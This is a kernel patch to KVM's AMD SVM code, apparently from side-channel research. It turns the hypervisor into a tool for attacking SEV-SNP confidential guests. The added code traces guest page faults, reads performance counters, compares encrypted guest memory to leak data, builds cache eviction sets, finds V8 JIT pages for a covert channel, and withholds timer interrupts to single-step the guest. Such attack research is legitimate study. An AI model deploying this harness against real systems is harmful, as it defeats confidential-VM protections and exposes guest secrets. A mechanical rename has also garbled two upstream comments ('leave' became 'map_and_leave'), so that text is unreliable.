+ u32 svm_msrpm_offset(u32 msr)
+ {
+ 	u32 offset;
+@@ -320,7 +548,7 @@ int svm_set_efer(struct kvm_vcpu *vcpu, u64 efer)
+ 			/*
+ 			 * Free the nested guest state, unless we are in SMM.
+ 			 * In this case we will return to the nested guest
+-			 * as soon as we leave SMM.
++			 * as soon as we map_and_leave SMM.
+ 			 */
+ 			if (!is_smm(vcpu))
+ 				svm_free_nested(svm);
+@@ -1425,9 +1653,50 @@ void svm_switch_vmcb(struct vcpu_svm *svm, struct kvm_vmcb_info *target_vmcb)
+ static int svm_vcpu_create(struct kvm_vcpu *vcpu)
+ {
+ 	struct vcpu_svm *svm;
++	struct page **evc_pages;
++	// struct page *evc_pages[512];
+ 	struct page *vmcb01_page;
+ 	struct page *vmsa_page = NULL;
+ 	int err;
++	int ret;
++
++	if ((vcpu->vcpu_id == 0) && sev_ctx.evict_buffer == NULL) {
++		/* Allocate the contiguous range */
++		ret = alloc_contig_range(EVICT_HIGH_PFN, EVICT_HIGH_PFN+512, MIGRATE_MOVABLE, GFP_KERNEL);
++		if (ret) {
++			trace_printk("[DEBUG] Failed to allocate contiguous range - vcpu_%d id:%d\n", vcpu->cpu, vcpu->vcpu_id);
++			return -ENOMEM;
++		}
++
++		evc_pages = kmalloc_array(512, sizeof(struct page *), GFP_KERNEL);
++		if (!evc_pages) {
++			kfree(evc_pages);
++			trace_printk("[DEBUG] Failed to allocate page array\n");
++			return -ENOMEM;
++		}
++		
++		for (unsigned long pfn = EVICT_HIGH_PFN; pfn < EVICT_HIGH_PFN+512; pfn++) {
++			evc_pages[pfn-EVICT_HIGH_PFN] = pfn_to_page(pfn);
++		}
++
++		sev_ctx.evict_buffer = vmap(evc_pages, 512, VM_MAP, PAGE_KERNEL);
++
++		if (!sev_ctx.evict_buffer) {
++			free_contig_range(EVICT_HIGH_PFN, 512);
++			kfree(evc_pages);
++			trace_printk("[DEBUG] vmap failed\n");
++			return -ENOMEM;
++		}
++
++		// Initialize the memory
++		memset(sev_ctx.evict_buffer, 0, 2 * 1024 * 1024);
++		sev_ctx.evict_buffer_pa = page_to_phys(evc_pages[0]);
++
++		trace_printk("[DEBUG] evict_buffer:%p pa:%llx\n", sev_ctx.evict_buffer, sev_ctx.evict_buffer_pa);
++		
++		sev_ctx.page_va = kmap_local_pfn(SEV_STEP_FLAG_BASE_PFN);
++
++	}
+ 
+ 	BUILD_BUG_ON(offsetof(struct vcpu_svm, vcpu) != 0);
+ 	svm = to_svm(vcpu);
+@@ -1468,6 +1737,13 @@ static int svm_vcpu_create(struct kvm_vcpu *vcpu)
+ 
+ 	svm->guest_state_loaded = false;
+ 
++	if (sev_es_guest(vcpu->kvm)) {
++		trace_printk("[DEBUG] SEV_ES/SNP VM\n");
++	}
++	else {
++		trace_printk("[DEBUG] Regular VM\n");
++	}
++
+ 	return 0;
+ 
+ error_free_vmsa_page:
+@@ -1503,6 +1779,10 @@ static void svm_vcpu_free(struct kvm_vcpu *vcpu)
+ 
+ 	sev_free_vcpu(vcpu);
+ 
++	if (vcpu->vcpu_id == 0) {
++		kunmap_local(sev_ctx.page_va);
++	}
++
+ 	__free_page(pfn_to_page(__sme_clr(svm->vmcb01.pa) >> PAGE_SHIFT));
+ 	__free_pages(virt_to_page(svm->msrpm), get_order(MSRPM_SIZE));
+ }
+@@ -2051,13 +2331,478 @@ static int pf_interception(struct kvm_vcpu *vcpu)
+ 			svm->vmcb->control.insn_len);
+ }
+ 
++static bool sev_step_pmc_clf_sw(struct kvm_vcpu *vcpu, u64 fault_address)
++{
++	struct vcpu_svm *svm = to_svm(vcpu);
++	bool clean = false;
++	/* Read the threshold from the shared page via the context */
++	u64 pmc_clf_sw_threshold = *((volatile u64 *)(sev_ctx.page_va + 1048));
++
++	/* Reset and read performance counter #1 */
++	rdmsrl(MSR_AMDSEV_PERF_CTR + 2, sev_ctx.msr_ctr[1]);
++	wrmsrl(MSR_AMDSEV_PERF_CTR + 2, 0);
++
++	if (sev_ctx.msr_ctr[1] == pmc_clf_sw_threshold) {
++		if (sev_ctx.pmc_sw == 2) {
++			trace_printk("[DEBUG] Time spent: %lld\n", rdpru_a() - sev_ctx.timer);
++			trace_printk("PMC[1] reaches threshold - End tracking - CLF: %lld\n", sev_ctx.msr_ctr[1]);
++			clean = true;
++		} else if (sev_ctx.pmc_sw == 1) {
++			trace_printk("[DEBUG] Time spent: %lld\n", rdpru_a() - sev_ctx.timer);
++			sev_ctx.timer = rdpru_a();
++			trace_printk("PMC[1] reaches threshold - Second Part Starts - CF_NUM in last part: %d\n", sev_ctx.cf_npf_num);
++			sev_ctx.cf_npf_num = 0;
++			sev_ctx.pmc_sw++;
++			sev_ctx.mem_npf_gfn_len = 0;
++		} else {
++			sev_ctx.cf_npf_num = 0;
++			trace_printk("PMC[1] reaches threshold - Start tracking - CLF: %lld\n", sev_ctx.msr_ctr[1]);
++			sev_ctx.pmc_sw++; // start NPF tracking
++			kvm_unpre_all_except_gfn(vcpu->kvm, (fault_address >> PAGE_SHIFT),
++			                         svm->vmcb->control.asid, false);
++			svm_flush_tlb_current(vcpu);
++			sev_ctx.timer = rdpru_a();
++		}
++	} else if (sev_ctx.msr_ctr[1] > pmc_clf_sw_threshold) {
++		trace_printk("[DEBUG] skip this run - VM Pages are not fully unmapped or pmc_threshold is not set correctly\n");
++		clean = true;
++	}
++	return clean;
++}
++
++/*--- enum for handler status ---*/
++enum npf_handler_status {
++    NPF_CONTINUE = 0,
++    NPF_MAP_AND_LEAVE,
++    NPF_CLEAN
++};
++
++/*
++ * handle_pmc_clflush_wrapper - Process clflush/PMC wrapper conditions.
++ *
++ * @vcpu:         Pointer to the current vCPU.
++ * @fault_address: The faulting guest physical address.
++ * @error_code:    Pointer to the error code for the fault.
++ * @is_code:       True if this is a user code page fault.
++ * @is_data:       True if this is a data (memory access) page fault.
++ * @pmc_clf_sw:    Local flag extracted from the shared page; indicates if the
++ *                 clflush wrapper is active.
++ * @covert_channel
++ * @wx_times
++ *
++ * Returns one of:
++ *   NPF_CONTINUE - Continue normal processing.
++ *   NPF_MAP_AND_LEAVE - Immediately map the page and exit.
++ *   NPF_CLEAN - Perform a full cleanup.
++ */
++static enum npf_handler_status handle_pmc_clflush_wrapper(struct kvm_vcpu *vcpu,
++                                                            u64 fault_address,
++                                                            u64 *error_code,
++                                                            bool is_code,
++                                                            bool is_data,
++                                                            u8 pmc_clf_sw,
++															u8 covert_channel,
++															u8 wx_times)
++{
++    u64 fault_gfn;
++	struct vcpu_svm *svm = to_svm(vcpu);
++
++    /* If the PMC wrapper is not active, nothing special to do. */
++    if (!pmc_clf_sw)
++        return NPF_CONTINUE;
++
++	/* For code pages, check if the code page triggers a "clean" condition. */
++    if (is_code && sev_step_pmc_clf_sw(vcpu, fault_address))
++		return NPF_CLEAN;
++
++    /* PMC wrapper has been set, but not encountered yet */
++	if (sev_ctx.pmc_sw == 0) {
++		if (is_code) {
++			sev_ctx.cf_npf_gfn = fault_address >> PAGE_SHIFT;
++		}
++		return NPF_MAP_AND_LEAVE;
++	}
++
++	/* This run is for a covert channel */ 
++	/* Detecting a TypeArray... */
++	if (!sev_ctx.covert_channel_start && (covert_channel == 0x77)) {
++		fault_gfn = fault_address >> PAGE_SHIFT;
++		if (is_code) {
++			/* Update GFN history */
++            sev_ctx.second_last_cf_npf_gfn = sev_ctx.last_cf_npf_gfn;
++			sev_ctx.last_cf_npf_gfn = sev_ctx.cf_npf_gfn;
++			sev_ctx.cf_npf_gfn = fault_gfn;
++            
++            if (sev_ctx.typearray_gfn == sev_ctx.cf_npf_gfn) {
++                trace_printk("[DEBUG] JS Code (X+W+X) Page Found!!!\n");
++                sev_ctx.wx_runtime++;
++				if (sev_ctx.wx_runtime == wx_times) {
++                    sev_ctx.covert_channel_start = true;
++					kvm_unpre_all_except_gfn(vcpu->kvm, sev_ctx.cf_npf_gfn,
++					                         svm->vmcb->control.asid, false);
++                    svm_flush_tlb_current(vcpu);
++
++                    /* re-init */
++                    sev_ctx.cf_npf_gfn = sev_ctx.last_cf_npf_gfn;
++					sev_ctx.last_cf_npf_gfn = sev_ctx.second_last_cf_npf_gfn;
++					sev_ctx.second_last_cf_npf_gfn = 0;
++					sev_ctx.timer = rdpru_a();
++                }
++            } else {
++				if (sev_ctx.second_last_cf_npf_gfn != sev_ctx.cf_npf_gfn) {
++					kvm_unpre_gfn(vcpu->kvm, sev_ctx.last_cf_npf_gfn,
++					              svm->vmcb->control.asid, true);
++				} else if (sev_ctx.typearray_map) {
++					kvm_unpre_gfn(vcpu->kvm, sev_ctx.typearray_gfn,
++					              svm->vmcb->control.asid, true);
++					sev_ctx.typearray_map = false;
++				}
++				svm_flush_tlb_current(vcpu);
++            }
++            return NPF_MAP_AND_LEAVE;
++        } else if (is_data) {
++			if (sev_ctx.typearray_gfn == 0) {
++				trace_printk("[DEBUG] MA: %llx\n", fault_gfn);
++				if (sev_ctx.last_cf_npf_gfn == fault_gfn) {
++					trace_printk("[DEBUG] X+W Found!!!\n");
++					sev_ctx.typearray_gfn = fault_gfn;
++					sev_ctx.typearray_map = true;
++				}
++			} else if (sev_ctx.typearray_gfn == fault_gfn) {
++				sev_ctx.typearray_map = true;
++			}
++			return NPF_MAP_AND_LEAVE;
++		}
++    }
++
++    return NPF_CONTINUE;
++}
++
++static inline int kvm_map_gfn(struct kvm_vcpu *vcpu,
++								u64 fault_address,
++								u64 error_code)
++{
++    int rc;
++	struct vcpu_svm *svm = to_svm(vcpu);
++
++    rc = kvm_mmu_page_fault(vcpu, fault_address, error_code,
++           static_cpu_has(X86_FEATURE_DECODEASSISTS) ?
++              svm->vmcb->control.insn_bytes : NULL,
++           svm->vmcb->control.insn_len);
++
++    if (rc > 0 && (error_code & PFERR_GUEST_RMP_MASK))
++        sev_handle_rmp_fault(vcpu, fault_address, error_code);
++
++    return rc;
++}
++
++/*--- Handler for code page faults ---*/
++static void handle_code_page(struct kvm_vcpu *vcpu, u64 fault_address,
++                            u64 error_code, u8 pmc_sca, 
++							u8 cipher_sca, u8 cache_sca, u8 dynamic_queue)
++{
++	struct vcpu_svm *svm = to_svm(vcpu);
++    u64 npf_pfn;
++
++	/* Update the faulting code page number in the context */
++	sev_ctx.cf_npf_gfn = fault_address >> PAGE_SHIFT;
++	kvm_sca_modify_gfn(vcpu->kvm, sev_ctx.cf_npf_gfn,
++	                   svm->vmcb->control.asid, 2);
++
++    /* Check for self faults (should not happen) */
++	if (sev_ctx.cf_npf_gfn == sev_ctx.last_cf_npf_gfn) {
++		trace_printk("[Bug] Faults on the current code page (is vCPU==1?)\n");
++		return;
++	}
++
++	/* Reset performance counters and update tracking */
++	rdmsrl(MSR_AMDSEV_PERF_CTR, sev_ctx.msr_ctr[0]);
++	wrmsrl(MSR_AMDSEV_PERF_CTR, 0);
++	sev_ctx.last_user_retired_instr_num = 0;
++	for (int i = 2; i < 6; i++) {
++		if (sev_ctx.msr_ctl[i]) {
++			rdmsrl(MSR_AMDSEV_PERF_CTR + i * 2, sev_ctx.msr_ctr[i]);
++			wrmsrl(MSR_AMDSEV_PERF_CTR + i * 2, 0);
++		}
++	}
++
++	/* Some conditions to decide whether this page is “interesting” */
++	bool interesting_page = true;
++	if ((sev_ctx.msr_ctr[0] == 0) && (sev_ctx.msr_ctr[5] > 0)) {
++
++		/* TODO: Check if re-use error_code is ok */
++		if ((sev_ctx.mem_npf_gfn_len == 0) && sev_ctx.last_cf_npf_gfn)
++			kvm_map_gfn(vcpu, sev_ctx.last_cf_npf_gfn << PAGE_SHIFT, error_code);
++		sev_ctx.second_last_cf_npf_gfn = sev_ctx.last_cf_npf_gfn;
++		sev_ctx.last_cf_npf_gfn = sev_ctx.cf_npf_gfn;
++		sev_ctx.ma_dead_loop = 0;
++		if (dynamic_queue)
++			sev_ctx.mem_mapped_queue_size = *((volatile u8 *)(sev_ctx.page_va + 96));
++		return;
++	} else if ((sev_ctx.msr_ctr[0] <= 1) && (sev_ctx.msr_ctr[2] == sev_ctx.msr_ctr[3])) {
++		// trace_printk("[Debug] SKIP CASE 2 - maybe ret from a syscall or cross page \n");
++		interesting_page = false;
++	} else if (sev_ctx.msr_ctr[5] > 2000) {
++		interesting_page = false;
++	}
++
++	/* Handle possible dead-loop behavior on the same code page */
++	if ((sev_ctx.mem_npf_gfn_len == 0) && (sev_ctx.cf_npf_gfn == sev_ctx.second_last_cf_npf_gfn)) {
++		if (sev_ctx.msr_ctr[0] <= 1)
++			sev_ctx.cf_dead_loop++;
++		else
++			sev_ctx.cf_dead_loop = 0;
++		if (sev_ctx.cf_dead_loop > LOOP_THRESHOLD) {
++			kvm_map_gfn(vcpu, sev_ctx.last_cf_npf_gfn << PAGE_SHIFT, error_code);
++			kvm_map_gfn(vcpu, fault_address, error_code);
++			sev_ctx.cf_dead_loop = 0;
++			sev_ctx.second_last_cf_npf_gfn = sev_ctx.last_cf_npf_gfn;
++			sev_ctx.last_cf_npf_gfn = sev_ctx.cf_npf_gfn;
++			return;
++		}
++	}
++
++	if (pmc_sca && sev_ctx.cf_npf_num > 0)
++		trace_printk("PMC %lld %lld %lld %lld %lld %lld\n",
++		             sev_ctx.msr_ctr[0], sev_ctx.msr_ctr[1], sev_ctx.msr_ctr[2],
++		             sev_ctx.msr_ctr[3], sev_ctx.msr_ctr[4], sev_ctx.msr_ctr[5]);
++
++	if (sev_ctx.state == SEVSCA_STATE_KERNEL_ACTIVE) {
++		sev_ctx.state = SEVSCA_STATE_ACTIVE;
++	}
++
++	/* (Optionally compare ciphertext blocks if cipher_sca is active) */
++	if (!sev_ctx.covert_channel_start) {
++		if (interesting_page && cipher_sca) {
++			for (int idx = 0; idx < sev_ctx.mem_npf_gfn_len; idx++) {
++				void *va;
++				npf_pfn = kvm_gfn_to_pfn(vcpu->kvm,
++				                         sev_ctx.mem_npf_gfn_list[idx],
++				                         svm->vmcb->control.asid);
++				if (!npf_pfn) {
++					trace_printk("[DEBUG] Failed to get GFN | Skip\n");
++					continue;
++				}
++				va = kmap_local_pfn(npf_pfn);
++				for (int i = 0; i < 256; i++) {
++					u16 vtmp = *((volatile u16 *)(va + i * 16));
++					if (sev_ctx.ciphertext_block_list[idx][i] != vtmp) {
++						trace_printk("CI %llx %d %04x %04x\n",
++						             sev_ctx.mem_npf_gfn_list[idx], i,
++						             sev_ctx.ciphertext_block_list[idx][i], vtmp);
++					}
++				}
++				kunmap_local(va);
++				sev_ctx.mem_npf_gfn_list[idx] = 0;
++			}
++		}
++	} else {
++		/* For covert channel, clear the list */
++		memset(sev_ctx.mem_npf_gfn_list, 0, sizeof(sev_ctx.mem_npf_gfn_list));
++		trace_printk("[DEBUG] Covert Channel: %lld\n", rdpru_a() - sev_ctx.timer);
++		sev_ctx.timer = rdpru_a();
++	}
++    
++	/* Unmap previous code page and any mapped data pages */
++	kvm_unpre_gfn(vcpu->kvm, sev_ctx.last_cf_npf_gfn,
++	              svm->vmcb->control.asid, true);
++    for (int i = 0; i < sev_ctx.mem_mapped_queue_size; i++) {
++		if (sev_ctx.mem_mapped_gfn[i]) {
++			kvm_unpre_gfn(vcpu->kvm, sev_ctx.mem_mapped_gfn[i],
++			              svm->vmcb->control.asid, true);
++			sev_ctx.mem_mapped_gfn[i] = 0;
++		}
++	}
++    svm_flush_tlb_current(vcpu);
++
++	sev_ctx.second_last_cf_npf_gfn = sev_ctx.last_cf_npf_gfn;
++	sev_ctx.last_cf_npf_gfn = sev_ctx.cf_npf_gfn;
++	sev_ctx.ma_dead_loop = 0;
++	sev_ctx.mem_npf_gfn_len = 0;
++
++	trace_printk("CF %06llx %d\n", sev_ctx.cf_npf_gfn, sev_ctx.cf_npf_num);
++	sev_ctx.cf_npf_num++;
++}
++
++/* Helper function to check whether the given fault GFN is already recorded. */
++static inline int find_recorded_index(u64 fault_gfn, 
++                                           u64 *gfn_list, 
++                                           u8 count)
++{
++    for (int i = 0; i < count; i++) {
++        if (gfn_list[i] == fault_gfn)
++            return i;
++    }
++    return -1;
++}
++
++/*--- Handler for data (MA) page faults ---*/
++static int handle_data_page(struct kvm_vcpu *vcpu, u64 fault_address,
++                            u64 error_code, u8 pmc_sca, 
++							u8 cipher_sca, u8 cache_sca, u8 dynamic_queue)
++{
++    int rc;
++	struct vcpu_svm *svm = to_svm(vcpu);
++    int recorded = -1;
++	u64 npf_pfn;
++    u64 fault_gfn = fault_address >> PAGE_SHIFT;
++    u64 user_instr_num, delta;
++
++    /* Clear the executable bit for this page */
++    kvm_sca_modify_gfn(vcpu->kvm, fault_gfn,
++                       svm->vmcb->control.asid, 1);
++
++    /* Update performance counter */
++    rdmsrl(MSR_AMDSEV_PERF_CTR, user_instr_num);
++    delta = user_instr_num - sev_ctx.last_user_retired_instr_num;
++	sev_ctx.last_user_retired_instr_num = user_instr_num;
++
++    /* Ensure this fault is not on an already mapped page */
++    for (int i = 0; i < sev_ctx.mem_mapped_queue_size; i++) {
++		if (fault_gfn == sev_ctx.mem_mapped_gfn[i]) {
++			trace_printk("[Bug] Faults on mapped page (is vCPU==1?)\n");
++			return 1;
++		}
++	}
++    
++	/* This range is typically for kernel */
++	if (fault_gfn < 0x100000) {
++		sev_ctx.is_interesting_ma_page = false;
++		return 1;
++	}
++
++	/* TODO: delta=0 here needs more thoughts, as one instruction could access multiple pages */
++	/* And we could miss pages for cache attack */
++	if (delta == 0) {
++		sev_ctx.is_interesting_ma_page = false;
++		sev_ctx.ma_dead_loop++;
++	}
++	else
++		sev_ctx.is_interesting_ma_page = true;
++
++	if (pmc_sca)
++		trace_printk("MA %06llx rt-ins:%lld\n", fault_gfn, delta);
++	else
++		trace_printk("MA %06llx\n", fault_gfn);
++
++	if (dynamic_queue && (sev_ctx.ma_dead_loop > 100)) {
++		/* TODO: find a number */
++		sev_ctx.mem_mapped_queue_size++;
++		sev_ctx.mem_mapped_gfn[sev_ctx.mem_mapped_queue_size - 1] = fault_gfn;
++	}
++	else {
++		if (sev_ctx.mem_mapped_gfn[0]) {
++			kvm_unpre_gfn(vcpu->kvm, sev_ctx.mem_mapped_gfn[0],
++						svm->vmcb->control.asid, true);
++			svm_flush_tlb_current(vcpu);
++		}
++		/* Update the page mapping queue */
++		/* TODO: Support a dynamic mechanism */
++		for (int i = 0; i < sev_ctx.mem_mapped_queue_size - 1; i++)
++			sev_ctx.mem_mapped_gfn[i] = sev_ctx.mem_mapped_gfn[i + 1];
++		sev_ctx.mem_mapped_gfn[sev_ctx.mem_mapped_queue_size - 1] = fault_gfn;
++	}
++
++	/* Access 24 different data pages */
++	if (sev_ctx.mem_npf_gfn_len >= 24) {
++		sev_ctx.is_interesting_ma_page = false;
++		trace_printk("[DEBUG] Potential kernel activity detected: ignoring all entries caused by the last CF\n");
++		sev_ctx.state = SEVSCA_STATE_KERNEL_ACTIVE;
++		return 1;
++	}
++    
++	/* Map the faulting page before reading ciphertext */
++	rc = kvm_map_gfn(vcpu, fault_address, error_code);
++	
++	/* mem_npf_gfn_list is for ciphertext only */
++	recorded = find_recorded_index(fault_gfn, sev_ctx.mem_npf_gfn_list, sev_ctx.mem_npf_gfn_len);
++	if (!sev_ctx.covert_channel_start) {
++        /* We compare the ciphertext on the next code fetch NPF */
++        /* Hence we only need to initialize a cipher[256] for this new GFN */
++        if (recorded < 0) {
++            if (cipher_sca) {
++                void *va;
++                npf_pfn = kvm_gfn_to_pfn(vcpu->kvm, fault_gfn,
++                                        svm->vmcb->control.asid);
++                va = kmap_local_pfn(npf_pfn);
++                for (int i = 0; i < 256; i++)
++					sev_ctx.ciphertext_block_list[sev_ctx.mem_npf_gfn_len][i] =
++					    *((volatile u16 *)(va + i * 16));
++                kunmap_local(va);
++            }
++        
++            sev_ctx.mem_npf_gfn_list[sev_ctx.mem_npf_gfn_len] = fault_gfn;
++			sev_ctx.mem_npf_gfn_len++;
++        }
++    } else {
++        /* For v8 covert_channel */
++        /* Find a new page, add it to mem_npf_gfn_list */
++        if (recorded < 0) {
++			void *va;
++			npf_pfn = kvm_gfn_to_pfn(vcpu->kvm, fault_gfn,
++			                         svm->vmcb->control.asid);
++			va = kmap_local_pfn(npf_pfn);
++			for (int j = 0; j < 256; j++)
++				sev_ctx.ciphertext_block_list[sev_ctx.mem_npf_gfn_len][j] =
++				    *((volatile u16 *)(va + j * 16));
++			kunmap_local(va);
++			sev_ctx.mem_npf_gfn_list[sev_ctx.mem_npf_gfn_len] = fault_gfn;
++			sev_ctx.mem_npf_gfn_len++;
++		} else {
++			void *va;
++			npf_pfn = kvm_gfn_to_pfn(vcpu->kvm, fault_gfn,
++			                         svm->vmcb->control.asid);
++			va = kmap_local_pfn(npf_pfn);
++			for (int j = 0; j < 256; j++) {
++				u16 vtmp = *((volatile u16 *)(va + j * 16));
++				if (sev_ctx.ciphertext_block_list[recorded][j] != vtmp) {
++					trace_printk("CI %llx %d\n", sev_ctx.mem_npf_gfn_list[recorded], j);
++					sev_ctx.ciphertext_block_list[recorded][j] = vtmp;
++				}
++			}
++			kunmap_local(va);
++		}
++    }
++
++	/* Setup eviction sets */
++    if (cache_sca && sev_ctx.is_interesting_ma_page) {
++		u64 pad, target_index;
++		if (sev_ctx.mem_mapped_gfn[sev_ctx.mem_mapped_queue_size - 1]) {
++			npf_pfn = kvm_gfn_to_pfn(vcpu->kvm,
++			                         sev_ctx.mem_mapped_gfn[sev_ctx.mem_mapped_queue_size - 1],
++			                         svm->vmcb->control.asid);
++			pad = l2_index_pad(sev_ctx.evict_buffer_pa, npf_pfn << PAGE_SHIFT);
++			target_index = (((npf_pfn << PAGE_SHIFT) & 0x1ffff) >> 6);
++			for (int i = 0; i < 64; i++)
++				sev_ctx.evict_set_offset[i] = (u16)((pad ^ (target_index + i)) & 0x7ff);
++		}
++	}
++    return 0;
++}
++
++
+ static int npf_interception(struct kvm_vcpu *vcpu)
+ {
+ 	struct vcpu_svm *svm = to_svm(vcpu);
+-	int rc;
++	int rc, map;
+ 
+ 	u64 fault_address = svm->vmcb->control.exit_info_2;
+ 	u64 error_code = svm->vmcb->control.exit_info_1;
++	u64 flag = *((volatile u64 *)(sev_ctx.page_va));
++
++	u8 cache_sca  = (flag >> 10) & 0x1;
++	u8 cipher_sca = (flag >> 11) & 0x1;
++	u8 pmc_sca    = (flag >> 12) & 0x1;
++	u8 dynamic_queue = (flag >> 13) & 0x1;
++	u8 pmc_clf_sw = (flag >> 15) & 0x1;
++
++	/* Additional info for v8 covert channel */
++	u8 covert_channel = *((volatile u8 *)(sev_ctx.page_va + 2048));
++	u8 wx_times = *((volatile u8 *)(sev_ctx.page_va + 2049));
++
++	bool is_code_page = is_user_code_page(error_code);
++	bool is_data_page = is_data_page_fault(error_code);
++	u32 cpage_num = flag >> 32;
+ 
+ 	/*
+ 	 * WARN if hardware generates a fault with an error code that collides
+@@ -2072,6 +2817,94 @@ static int npf_interception(struct kvm_vcpu *vcpu)
+ 		error_code |= PFERR_PRIVATE_ACCESS;
+ 
+ 	trace_kvm_page_fault(vcpu, fault_address, error_code);
++
++	/* If our special flag isn’t set, reset state and go map-and-leave */
++	if ((flag & 0xff) != 0x77) {
++		sev_ctx.pmc_sw = 0;
++		sev_ctx.state = SEVSCA_STATE_UNINITIALIZED;
++		goto map_and_leave;
++	}
++
++	/* Pass the local pmc_clf_sw into our helper */
++	switch (handle_pmc_clflush_wrapper(vcpu, fault_address, &error_code,
++	                                   is_code_page, is_data_page, pmc_clf_sw,
++	                                   covert_channel, wx_times)) {
++	case NPF_MAP_AND_LEAVE:
++		goto map_and_leave;
++	case NPF_CLEAN:
++		goto clean;
++	case NPF_CONTINUE:
++	default:
++		break;
++	}
++			
++	if (is_code_page) {
++		handle_code_page(vcpu, fault_address, error_code,
++		                 pmc_sca, cipher_sca, cache_sca, dynamic_queue);
++    } else if (is_data_page) {
++		if (sev_ctx.state == SEVSCA_STATE_KERNEL_ACTIVE)
++			goto map_and_leave;
++		map = handle_data_page(vcpu, fault_address, error_code,
++		                       pmc_sca, cipher_sca, cache_sca, dynamic_queue);
++		if (map)
++			goto map_and_leave;
++	}
++	else {
++		/* Uninteresting memory-access fault: mark skip and map */
++        // trace_printk("GN:%llx EC:0x%llx\n", fault_address >> PAGE_SHIFT, error_code);
++	}
++
++	if (sev_ctx.cf_npf_num >= cpage_num) {
++clean:		
++		trace_printk("[DEBUG] Clean ALL\n");
++		
++		if (cache_sca) {
++			u64 l3_high_mem;
++
++			/* Enable L1/L2 hardware prefetcher */
++			wrmsrl(0xC0000108, 0x0);
++			/* Release L3 cache */
++			wrmsrl(MSR_AMDSEV_RESERVE_RANGE_HIGH, RANGE_HIGH_VALUE);
++			rdmsrl(0xC0011096, l3_high_mem);
++		}
++
++		/* Reset state */
++		sev_ctx.state = SEVSCA_STATE_UNINITIALIZED;
++		sev_ctx.mem_mapped_queue_size = 0;
++		sev_ctx.guest_reschedue_threshold = 0;
++		sev_ctx.inject_intr_interception = true;
++		sev_ctx.pmc_sw = 0;
++		sev_ctx.wx_runtime = 0;
++		sev_ctx.typearray_map = false;
++		sev_ctx.covert_channel_start = false;
++		sev_ctx.typearray_gfn = 0;
++		sev_ctx.cf_npf_num = 0;
++		sev_ctx.cf_npf_gfn = 0;
++		sev_ctx.last_cf_npf_gfn = 0;
++		memset(sev_ctx.mem_mapped_gfn, 0, sizeof(sev_ctx.mem_mapped_gfn));
++		sev_ctx.mem_npf_gfn_len = 0;
++		sev_ctx.vmsa_page_pad = 0;
++		sev_ctx.hsave_page_pad = 0;
++		sev_ctx.apic_interval = 0;
++
++		for (int i = 1; i < 6; i++) {
++			sev_ctx.msr_ctl[i] = 0;
++			wrmsrl(MSR_AMDSEV_PERF_CTL + i * 2, 0);
++		}
++		*((volatile u64 *)sev_ctx.page_va) = 0;
++		memset(sev_ctx.page_va, 0, 4096);
++
++		if (sev_ctx.guest_reschedue_miss > 0) {
++			kvm_lapic_set_irr(0xec, vcpu->arch.apic);
++			smp_mb__after_atomic();
++			svm_complete_interrupt_delivery(vcpu,
++				sev_ctx.original_apic_delivery_mode,
++				sev_ctx.original_apic_trig_mode, 0xec);
++			sev_ctx.guest_reschedue_miss--;
++		}
++	}
++
++map_and_leave:
+ 	rc = kvm_mmu_page_fault(vcpu, fault_address, error_code,
+ 				static_cpu_has(X86_FEATURE_DECODEASSISTS) ?
+ 				svm->vmcb->control.insn_bytes : NULL,
+@@ -2589,6 +3422,7 @@ static int iret_interception(struct kvm_vcpu *vcpu)
+ 	struct vcpu_svm *svm = to_svm(vcpu);
+ 
+ 	WARN_ON_ONCE(sev_es_guest(vcpu->kvm));
++	trace_printk("iret_interception\n");
+ 
+ 	++vcpu->stat.nmi_window_exits;
+ 	svm->awaiting_iret_completion = true;
+@@ -3022,7 +3856,7 @@ static int svm_set_msr(struct kvm_vcpu *vcpu, struct msr_data *msr)
+ 				return 1;
+ 			/*
+ 			 * In case TSC scaling is not enabled, always
+-			 * leave this MSR at the default value.
++			 * map_and_leave this MSR at the default value.
+ 			 *
+ 			 * Due to bug in qemu 6.2.0, it would try to set
+ 			 * this msr to 0 if tsc scaling is not enabled.
+@@ -3705,17 +4539,72 @@ void svm_complete_interrupt_delivery(struct kvm_vcpu *vcpu, int delivery_mode,
+ static void svm_deliver_interrupt(struct kvm_lapic *apic,  int delivery_mode,
+ 				  int trig_mode, int vector)
+ {
+-	kvm_lapic_set_irr(vector, apic);
+-
+-	/*
+-	 * Pairs with the smp_mb_*() after setting vcpu->guest_mode in
+-	 * vcpu_enter_guest() to ensure the write to the vIRR is ordered before
+-	 * the read of guest_mode.  This guarantees that either VMRUN will see
+-	 * and process the new vIRR entry, or that svm_complete_interrupt_delivery
+-	 * will signal the doorbell if the CPU has already entered the guest.
++	/* Single-stepping 
++	 * Filter the APIC Timer interrupt sent to the guest
+ 	 */
+-	smp_mb__after_atomic();
+-	svm_complete_interrupt_delivery(apic->vcpu, delivery_mode, trig_mode, vector);
++
++	// u8 sw = *((volatile u8 *)(sev_step_page_va));
++	u32 flag = *((volatile u32 *)(sev_ctx.page_va));
++	u8 int_allowed = (flag >> 8) & 0x1;
++	u8 pmc_clf_sw = (flag >> 15) & 0x1;
++	bool cancel_apic_injection;
++	if (pmc_clf_sw)
++		cancel_apic_injection = (sev_ctx.pmc_sw != 0);
++	else
++		cancel_apic_injection = (sev_ctx.state != SEVSCA_STATE_UNINITIALIZED);
++	
++	if (cancel_apic_injection) {
++		
++		/* Now use other interrupts to inject apic timer interrupts 0xec */
++		if (vector != 0xec) {
++			
++			sev_ctx.guest_reschedue_threshold++;
++		
++			/* Inject other interrupts as usual */
++			kvm_lapic_set_irr(vector, apic);
++			smp_mb__after_atomic();
++			svm_complete_interrupt_delivery(apic->vcpu, delivery_mode, trig_mode, vector);
++
++			if ((sev_ctx.guest_reschedue_threshold >= 4) && int_allowed) {
++
++				/* We have to inject some timer interrupts */
++				/* Otherwise the guest kernel cannot reschedule tasks */
++				if (!sev_ctx.start_injecting_apic) {
++					sev_ctx.start_injecting_apic = true;
++					trace_printk("[DEBUG] START INJECTING APIC TIMER INTERRUPTS. REMIANING:%d\n", sev_ctx.guest_reschedue_miss);
++				}
++			}
++		}
++		else {
++			/* Doesn't work to inject here, as the injected apic int is not a host event */
++			
++			sev_ctx.original_apic_delivery_mode = delivery_mode;
++			sev_ctx.original_apic_trig_mode = trig_mode;
++			sev_ctx.inject_intr_interception = false;
++			sev_ctx.guest_reschedue_miss++;
++		}
++
++	} else {
++		kvm_lapic_set_irr(vector, apic);
++
++		/*
++		* Pairs with the smp_mb_*() after setting vcpu->guest_mode in
++		* vcpu_enter_guest() to ensure the write to the vIRR is ordered before
++		* the read of guest_mode.  This guarantees that either VMRUN will see
++		* and process the new vIRR entry, or that svm_complete_interrupt_delivery
